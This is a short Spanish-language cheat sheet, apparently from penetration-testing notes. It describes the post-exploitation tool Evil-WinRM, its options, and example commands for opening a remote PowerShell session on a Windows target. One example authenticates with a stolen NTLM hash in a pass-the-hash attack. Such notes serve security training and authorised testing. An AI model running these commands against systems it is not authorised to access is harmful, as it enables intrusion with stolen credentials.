### **Ataques de Pass-the-Hash/Evil-WinRM.md**

# Evil-WinRM

## Descripción

`Evil-WinRM` es una herramienta de post-explotación que proporciona una interfaz interactiva similar a una shell de PowerShell para administrar sistemas Windows de manera remota. Utiliza WinRM (Windows Remote Management) para establecer una conexión segura y ejecutar comandos en el sistema objetivo.

## Uso

```bash
evil-winrm [opciones]
```

### Opciones principales

- `-i`, `--ip`: Dirección IP del objetivo.
- `-u`, `--username`: Nombre de usuario para autenticación.
- `-p`, `--password`: Contraseña para autenticación.
- `--ssl`: Utiliza SSL para la conexión.
- `-P`, `--pem`: Archivo PEM para autenticación.
- `-H`, `--hash`: Hash NTLM para autenticación.
- `-h`, `--help`: Muestra la ayuda y opciones disponibles.

## Ejemplos

- Conectar a un objetivo usando usuario y contraseña:
  
  ```bash
  evil-winrm -i 192.168.1.10 -u administrador -p Contraseña123
  ```

- Conectar usando SSL:
  
  ```bash
  evil-winrm -i 192.168.1.10 -u administrador -p Contraseña123 --ssl
  ```

- Conectar usando un hash NTLM:
  
  ```bash
  evil-winrm -i 192.168.1.10 -u administrador -H HASH_NTLM
  ```

